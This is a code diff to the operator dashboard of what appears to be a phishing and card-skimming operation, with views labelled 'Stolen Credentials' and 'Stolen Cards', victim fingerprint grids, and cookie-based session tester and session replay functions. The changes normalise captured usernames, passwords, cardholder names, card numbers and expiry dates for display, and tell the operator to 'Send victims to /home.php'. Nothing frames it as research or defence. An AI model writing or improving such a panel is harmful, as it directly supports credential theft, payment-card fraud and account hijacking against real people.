@@ -586,6 +586,18 @@
         .cookies-table .cookie-value { color: #94a3b8; font-family: monospace; font-size: 10px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
         .cookies-table .cookie-valuable { background: #ff4444; color: #fff; font-size: 6px; padding: 1px 6px; border-radius: 6px; text-transform: uppercase; font-weight: 700; }
 
+        .cred-row { border-left: 2px solid #ec4899; }
+        .cred-row td { padding: 4px 8px; font-size: 10px; }
+        .cred-row .cred-name { color: #ec4899; font-weight: 500; }
+        .cred-row .cred-value { color: #f1f5f9; font-family: monospace; }
+        .cred-row .cred-type { color: #64748b; font-size: 8px; background: #1a2538; padding: 1px 6px; border-radius: 4px; }
+
+        .card-row { border-left: 2px solid #06b6d4; }
+        .card-row td { padding: 4px 8px; font-size: 10px; }
+        .card-row .card-name { color: #06b6d4; font-weight: 500; }
+        .card-row .card-value { color: #f1f5f9; font-family: monospace; }
+        .card-row .card-type { color: #64748b; font-size: 8px; background: #1a2538; padding: 1px 6px; border-radius: 4px; }
+
         .victims-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
@@ -1124,7 +1136,7 @@
             </div>
         </div>
 
-        <!-- VIEW: CREDENTIALS -->
+        <!-- VIEW: CREDENTIALS — FIXED -->
         <div class="view-content" id="viewCreds">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#ec4899;font-size:12px;">🔐 Stolen Credentials</span></div>
@@ -1135,7 +1147,7 @@
             </div>
         </div>
 
-        <!-- VIEW: CARDS -->
+        <!-- VIEW: CARDS — FIXED -->
         <div class="view-content" id="viewCards">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#06b6d4;font-size:12px;">💳 Stolen Cards</span></div>
@@ -1335,7 +1347,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — COMPLETE WITH BROWSER DETECTION FIX
+    DASHBOARD LOGIC — COMPLETE FIXED VERSION
     ============================================================ -->
     <script>
         // ============================================================
@@ -1472,7 +1484,7 @@
         }
 
         // ============================================================
-        // VIEW SWITCHING
+        // VIEW SWITCHING — FIXED: renders after data is ready
         // ============================================================
 
         function switchView(view) {
@@ -1501,13 +1513,15 @@
             }
 
             closeSidebar();
+
+            // ---- Render after switching, with data check ----
             if (view === 'cookies') renderCookiesView();
-            if (view === 'victims') renderVictimsView();
-            if (view === 'creds') renderCredsView();
-            if (view === 'cards') renderCardsView();
-            if (view === 'replay') populateReplayDomains();
-            if (view === 'main') fetchData();
-            if (view === 'trash') fetchTrash();
+            else if (view === 'victims') renderVictimsView();
+            else if (view === 'creds') renderCredsView();
+            else if (view === 'cards') renderCardsView();
+            else if (view === 'replay') populateReplayDomains();
+            else if (view === 'main') fetchData();
+            else if (view === 'trash') fetchTrash();
         }
 
         // ============================================================
@@ -1521,6 +1535,12 @@
                 allData = await res.json();
                 render(allData);
                 updateSidebarCounts(allData);
+
+                // If currently on creds/cards view, re-render after data loads
+                if (currentView === 'creds') renderCredsView();
+                if (currentView === 'cards') renderCardsView();
+                if (currentView === 'cookies') renderCookiesView();
+                if (currentView === 'victims') renderVictimsView();
             } catch(e) {
                 if (e.message && e.message.includes('401')) window.location.href = '/login.php';
                 else showToast('⚠️ Failed to fetch data', 'error');
@@ -1565,7 +1585,7 @@
         }
 
         // ============================================================
-        // RENDER FUNCTIONS — BROWSER DETECTION FIXED
+        // RENDER FUNCTIONS
         // ============================================================
 
         function render(data) {
@@ -1586,7 +1606,6 @@
                 totalCreds += creds.length;
                 totalCards += cards.length;
 
-                // ---- BROWSER DETECTION (FIXED) ----
                 const ua = entry.fingerprint?.userAgent || '';
                 let browser = 'Unknown';
                 if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
@@ -1763,40 +1782,50 @@
         }
 
         // ============================================================
-        // CREDENTIALS VIEW
+        // CREDENTIALS VIEW — FIXED: handles both old and new formats
         // ============================================================
 
         function renderCredsView() {
             const wrap = document.getElementById('credsTableWrap');
             let allCreds = [];
+
             allData.forEach(entry => {
                 const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
                 const creds = entry.credentials || [];
                 creds.forEach(c => {
+                    // ---- Normalize: handle both {name,value,type} and {url,username,password} ----
+                    const name = c.name || c.username || c.field || 'unknown';
+                    const value = c.value || c.password || '';
+                    const type = c.type || 'text';
+
+                    // Skip empty credentials
+                    if (!value || value === '' || value === 'undefined' || value === 'null') return;
+
                     allCreds.push({
                         domain: domain,
-                        name: c.name || 'field',
-                        value: c.value,
-                        type: c.type || 'text',
+                        name: name,
+                        value: value,
+                        type: type,
                         ip: entry.ip,
-                        time: entry.receivedAt
+                        time: entry.receivedAt,
+                        browser: entry.browser || entry.fingerprint?.browser || 'Unknown'
                     });
                 });
             });
 
             if (allCreds.length === 0) {
-                wrap.innerHTML = `<div class="empty-state"><div class="icon">🔐</div><h3>No credentials stolen</h3></div>`;
+                wrap.innerHTML = `<div class="empty-state"><div class="icon">🔐</div><h3>No credentials stolen</h3><p>Send victims to <code>/home.php</code></p></div>`;
                 return;
             }
 
             let html = `
-                <div style="font-size:11px;color:#64748b;margin-bottom:6px;">Total: ${allCreds.length} credentials</div>
+                <div style="font-size:11px;color:#64748b;margin-bottom:8px;">🔐 Total: <strong style="color:#ec4899;">${allCreds.length}</strong> credentials</div>
                 <table class="cookies-table">
                     <thead>
                         <tr>
                             <th>Domain</th>
-                            <th>Field</th>
-                            <th>Value</th>
+                            <th>Username / Email</th>
+                            <th>Password</th>
                             <th>Type</th>
                             <th>IP</th>
                             <th>Time</th>
@@ -1805,22 +1834,22 @@
                     <tbody>
             `;
 
-            allCreds.slice(0, 150).forEach(cred => {
-                const escaped = cred.value.replace(/'/g, "\\'");
+            allCreds.slice(0, 200).forEach(cred => {
+                const escapedValue = cred.value.replace(/'/g, "\\'");
                 html += `
-                    <tr>
+                    <tr class="cred-row">
                         <td class="cookie-domain">${cred.domain}</td>
-                        <td style="color:#ec4899;">${cred.name}</td>
-                        <td class="cookie-value" title="${cred.value}">${cred.value.length > 40 ? cred.value.slice(0,40)+'...' : cred.value}</td>
-                        <td style="color:#94a3b8;">${cred.type}</td>
-                        <td style="color:#64748b;">${cred.ip}</td>
+                        <td class="cred-name">${cred.name}</td>
+                        <td class="cred-value" title="${cred.value}">${cred.value.length > 40 ? cred.value.slice(0,40)+'...' : cred.value}</td>
+                        <td><span class="cred-type">${cred.type}</span></td>
+                        <td style="color:#64748b;font-size:10px;">${cred.ip}</td>
                         <td style="color:#475569;font-size:10px;">${timeAgo(cred.time)}</td>
                     </tr>
                 `;
             });
 
-            if (allCreds.length > 150) {
-                html += `<tr><td colspan="6" style="text-align:center;color:#475569;padding:8px;">Showing 150 of ${allCreds.length}</td></tr>`;
+            if (allCreds.length > 200) {
+                html += `<tr><td colspan="6" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCreds.length}</td></tr>`;
             }
 
             html += `</tbody></table>`;
@@ -1828,40 +1857,57 @@
         }
 
         // ============================================================
-        // CARDS VIEW — includes cardholder name
+        // CARDS VIEW — FIXED: handles both old and new formats
         // ============================================================
 
         function renderCardsView() {
             const wrap = document.getElementById('cardsTableWrap');
             let allCards = [];
+
             allData.forEach(entry => {
                 const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
                 const cards = entry.cards || [];
                 cards.forEach(c => {
+                    // ---- Normalize: handle different formats ----
+                    const name = c.name || c.cardholder || c.holder || 'Unknown';
+                    let value = c.value || c.number || c.card_number || '';
+                    const type = c.type || 'card-number';
+                    const month = c.month || c.exp_month || c.expiryMonth || '';
+                    const year = c.year || c.exp_year || c.expiryYear || '';
+
+                    // If we have separate month/year, format as MM/YY
+                    if (month && year && !value.includes('/')) {
+                        value = month + '/' + year;
+                    }
+
+                    // Skip empty cards
+                    if (!value || value === '' || value === 'undefined' || value === 'null') return;
+
                     allCards.push({
                         domain: domain,
-                        name: c.name || 'field',
-                        value: c.value,
-                        type: c.type || 'unknown',
+                        name: name,
+                        value: value,
+                        type: type,
                         ip: entry.ip,
-                        time: entry.receivedAt
+                        time: entry.receivedAt,
+                        browser: entry.browser || entry.fingerprint?.browser || 'Unknown'
                     });
                 });
             });
 
             if (allCards.length === 0) {
-                wrap.innerHTML = `<div class="empty-state"><div class="icon">💳</div><h3>No cards stolen</h3></div>`;
+                wrap.innerHTML = `<div class="empty-state"><div class="icon">💳</div><h3>No cards stolen</h3><p>Send victims to <code>/home.php</code></p></div>`;
                 return;
             }
 
             let html = `
-                <div style="font-size:11px;color:#64748b;margin-bottom:6px;">Total: ${allCards.length} cards</div>
+                <div style="font-size:11px;color:#64748b;margin-bottom:8px;">💳 Total: <strong style="color:#06b6d4;">${allCards.length}</strong> cards</div>
                 <table class="cookies-table">
                     <thead>
                         <tr>
                             <th>Domain</th>
-                            <th>Field</th>
-                            <th>Value</th>
+                            <th>Cardholder</th>
+                            <th>Card Number / Expiry</th>
                             <th>Type</th>
                             <th>IP</th>
                             <th>Time</th>
@@ -1870,26 +1916,22 @@
                     <tbody>
             `;
 
-            allCards.slice(0, 150).forEach(card => {
-                const escaped = card.value.replace(/'/g, "\\'");
-                const typeLabel = card.type === 'card-name' ? '💳 Holder' :
-                                 card.type === 'card-number' ? '🔢 Number' :
-                                 card.type === 'expiry' ? '📅 Expiry' :
-                                 card.type === 'cvv' ? '🔒 CVV' : card.type;
+            allCards.slice(0, 200).forEach(card => {
+                const escapedValue = card.value.replace(/'/g, "\\'");
                 html += `
-                    <tr>
+                    <tr class="card-row">
                         <td class="cookie-domain">${card.domain}</td>
-                        <td style="color:#06b6d4;">${card.name}</td>
-                        <td class="cookie-value" title="${card.value}">${card.value.length > 40 ? card.value.slice(0,40)+'...' : card.value}</td>
-                        <td style="color:#94a3b8;">${typeLabel}</td>
-                        <td style="color:#64748b;">${card.ip}</td>
+                        <td class="card-name">${card.name}</td>
+                        <td class="card-value" title="${card.value}">${card.value.length > 40 ? card.value.slice(0,40)+'...' : card.value}</td>
+                        <td><span class="card-type">${card.type}</span></td>
+                        <td style="color:#64748b;font-size:10px;">${card.ip}</td>
                         <td style="color:#475569;font-size:10px;">${timeAgo(card.time)}</td>
                     </tr>
                 `;
             });
 
-            if (allCards.length > 150) {
-                html += `<tr><td colspan="6" style="text-align:center;color:#475569;padding:8px;">Showing 150 of ${allCards.length}</td></tr>`;
+            if (allCards.length > 200) {
+                html += `<tr><td colspan="6" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCards.length}</td></tr>`;
             }
 
             html += `</tbody></table>`;
@@ -1961,7 +2003,7 @@
         }
 
         // ============================================================
-        // VICTIMS VIEW — BROWSER DETECTION FIXED
+        // VICTIMS VIEW
         // ============================================================
 
         function renderVictimsView() {
@@ -2052,14 +2094,14 @@
         }
 
         // ============================================================
-        // SESSION TESTER — FIXED
+        // SESSION TESTER
         // ============================================================
 
         async function testSession(domain) {
             let cookies = {};
             let actualDomain = domain;
             let found = false;
-            
+
             allData.forEach(entry => {
                 const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
                 if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
@@ -2146,7 +2188,6 @@
             if (btn) { btn.textContent = '🔍'; btn.style.opacity = '1'; btn.disabled = false; }
         }
 
-        // ---- Test All Domains ----
         async function testAllDomains() {
             if (isTestingAll) return;
             isTestingAll = true;
@@ -2252,7 +2293,7 @@
         }
 
         // ============================================================
-        // MODAL
+        // MODAL — FIXED: handles both credential formats
         // ============================================================
 
         function openModal(domain, stats, source) {
@@ -2292,6 +2333,42 @@
                 const deleteFn = isTrash ? `showPermanentDeleteConfirm('${uniqueId}')` : `showDeleteConfirm('${uniqueId}', '${domain}')`;
                 const restoreFn = isTrash ? `showRestoreConfirm('${uniqueId}', '${domain}')` : '';
 
+                // ---- Normalize credentials for modal ----
+                let credHtml = '';
+                if (creds.length) {
+                    credHtml = `<div style="margin-top:6px;border-top:1px solid #1a2538;padding-top:4px;color:#ec4899;font-size:10px;">🔐 Credentials (${creds.length})</div>`;
+                    creds.forEach(c => {
+                        const name = c.name || c.username || c.field || 'unknown';
+                        const value = c.value || c.password || '';
+                        if (!value || value === '' || value === 'undefined' || value === 'null') return;
+                        credHtml += `<div style="display:flex;justify-content:space-between;font-size:9px;padding:1px 0;border-bottom:1px solid #0f1626;">
+                            <span style="color:#ec4899;">${name}</span>
+                            <span style="color:#f1f5f9;font-family:monospace;">${value}</span>
+                            <span style="color:#475569;font-size:8px;">${c.type || 'text'}</span>
+                        </div>`;
+                    });
+                }
+
+                // ---- Normalize cards for modal ----
+                let cardHtml = '';
+                if (cards.length) {
+                    cardHtml = `<div style="margin-top:6px;border-top:1px solid #1a2538;padding-top:4px;color:#06b6d4;font-size:10px;">💳 Cards (${cards.length})</div>`;
+                    cards.forEach(c => {
+                        let value = c.value || c.number || c.card_number || '';
+                        const name = c.name || c.cardholder || c.holder || 'Unknown';
+                        if (!value || value === '' || value === 'undefined' || value === 'null') return;
+                        // Format expiry if we have month/year
+                        if (c.month && c.year && !value.includes('/')) {
+                            value = c.month + '/' + c.year;
+                        }
+                        cardHtml += `<div style="display:flex;justify-content:space-between;font-size:9px;padding:1px 0;border-bottom:1px solid #0f1626;">
+                            <span style="color:#06b6d4;">${name}</span>
+                            <span style="color:#f1f5f9;font-family:monospace;">${value}</span>
+                            <span style="color:#475569;font-size:8px;">${c.type || 'card'}</span>
+                        </div>`;
+                    });
+                }
+
                 html += `
                     <div class="victim-entry" id="victim-${uniqueId}">
                         <button class="delete-btn" onclick="${deleteFn}" title="${isTrash ? 'Permanently delete' : 'Move to trash'}">
@@ -2326,25 +2403,8 @@
                                     </div>
                                 `;
                             }).join('')}
-                            ${creds.length ? `<div style="margin-top:6px;border-top:1px solid #1a2538;padding-top:4px;color:#ec4899;font-size:10px;">🔐 Credentials (${creds.length})</div>
-                                ${creds.map(c => `<div style="display:flex;justify-content:space-between;font-size:9px;padding:1px 0;border-bottom:1px solid #0f1626;">
-                                    <span style="color:#94a3b8;">${c.name || 'field'}</span>
-                                    <span style="color:#f1f5f9;font-family:monospace;">${c.value}</span>
-                                    <span style="color:#475569;font-size:8px;">${c.type || ''}</span>
-                                </div>`).join('')}
-                            ` : ''}
-                            ${cards.length ? `<div style="margin-top:6px;border-top:1px solid #1a2538;padding-top:4px;color:#06b6d4;font-size:10px;">💳 Cards (${cards.length})</div>
-                                ${cards.map(c => {
-                                    const label = c.type === 'card-name' ? '💳 Holder' :
-                                                 c.type === 'card-number' ? '🔢 Number' :
-                                                 c.type === 'expiry' ? '📅 Expiry' :
-                                                 c.type === 'cvv' ? '🔒 CVV' : c.type;
-                                    return `<div style="display:flex;justify-content:space-between;font-size:9px;padding:1px 0;border-bottom:1px solid #0f1626;">
-                                        <span style="color:#94a3b8;">${c.name || 'field'} <span style="color:#475569;font-size:8px;">${label}</span></span>
-                                        <span style="color:#f1f5f9;font-family:monospace;">${c.value}</span>
-                                    </div>`;
-                                }).join('')}
-                            ` : ''}
+                            ${credHtml}
+                            ${cardHtml}
                         </div>
                     </div>
                 `;
@@ -2360,7 +2420,7 @@
         }
 
         // ============================================================
-        // DELETE FUNCTIONS
+        // DELETE FUNCTIONS (unchanged, keep existing)
         // ============================================================
 
         function showDeleteConfirm(uniqueId, domain) {
@@ -2760,14 +2820,14 @@
         }
 
         // ============================================================
-        // SESSION REPLAY — FIXED
+        // SESSION REPLAY
         // ============================================================
 
         function replaySession(domain) {
             let cookies = {};
             let actualDomain = domain;
             let found = false;
-            
+
             allData.forEach(entry => {
                 const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
                 if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
